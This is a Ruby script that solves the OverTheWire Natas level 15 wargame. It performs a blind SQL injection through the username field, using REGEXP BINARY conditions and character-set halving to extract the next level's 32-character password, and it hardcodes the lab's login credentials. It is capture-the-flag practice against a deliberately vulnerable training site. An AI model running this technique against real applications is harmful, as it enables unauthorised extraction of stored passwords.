#!/usr/bin/env ruby

require 'rubygems'
require 'bundler/setup'
Bundler.require(:default)

class NatasBlindSQLI
  def password_query regex
    "natas16\" AND password REGEXP BINARY '#{regex}' -- "
  end

  def password_match_request regex
    puts ' ' * 12 + "< #{password_query(regex)}"
    Unirest.post "http://natas15.natas.labs.overthewire.org/",
                 auth: { user: "natas15", password: "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"},
                 parameters: { :username => password_query(regex) }
  end

  def password_matches? regex
    password_match_request(regex).body.include? "This user exists."
  end

  # Keep halving the possible character set until we have just one
  def get_next_char extracted_password, options
    num_chars_to_go = options[:length] - extracted_password.length
    remainder = ".{#{num_chars_to_go-1}}"
    possible_charset = options[:charset]
    while possible_charset.length > 1
      charset_slices = possible_charset.chars.each_slice((possible_charset.size/2.0).round).to_a.map(&:join)
      char_test = "[#{charset_slices[1]}]"
      regex = ['^', extracted_password, char_test, remainder, '$'].join
      matched = password_matches?(regex)
      puts ' ' * 18 + "> Matched: #{matched ? 'yes' : 'no'}"
      matching_slice = matched ? 1 : 0
      possible_charset = charset_slices[matching_slice]
      puts ' ' * 6 + "> #{possible_charset}"
    end
    possible_charset
  end

  def extract_password options
    ''.tap do |extracted_password|
      options[:length].times do
        extracted_password << get_next_char(extracted_password, options)
        puts '', extracted_password
      end
    end
  end

  def initialize options = {}
    options = {
      charset: ['A'..'Z', 'a'..'z', '0'..'9'].map{|r|r.to_a}.flatten.join,
      length: 32,
    }.merge options
    puts "Using character set: #{options[:charset]}"
    extract_password options
  end
end

if __FILE__ == $0
  NatasBlindSQLI.new
end